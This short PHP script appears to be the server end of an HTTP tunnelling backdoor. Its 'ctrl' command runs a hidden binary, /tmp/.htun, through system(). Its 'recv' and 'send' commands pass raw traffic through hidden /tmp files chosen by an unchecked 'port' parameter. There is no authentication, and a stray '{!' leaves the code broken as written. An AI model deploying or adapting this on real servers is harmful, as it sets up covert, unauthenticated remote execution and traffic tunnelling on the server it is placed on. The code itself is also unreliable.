<?php

// configuracion
define('F_RECV', '/tmp/.send');
define('F_SEND', '/tmp/.recv');
define('F_SERVER', '/tmp/.htun');
define('SZ_SBUF', 1024);

// ctrl
if ($_GET['cmd'] == 'ctrl')
{
	system(F_SERVER);
}

// recv
else if ($_GET['cmd'] == 'recv')
{!
	header('Content-Type: application/octet-stream');
	$f = fopen(F_RECV . "." . $_GET['port'], 'rb');
	$data = fread($f, SZ_SBUF);
	echo $data;
	fclose($f);
}

// send 
else if ($_GET['cmd'] == 'send')
{
	$payload = file_get_contents("php://input");
	$sz = strlen($payload);
	$f = fopen(F_SEND . "." . $_GET['port'], 'wb');
	fwrite($f, $payload, $sz);
	fclose($f);
}

// error ?
else throw new Exception('cmd invalid');

?>
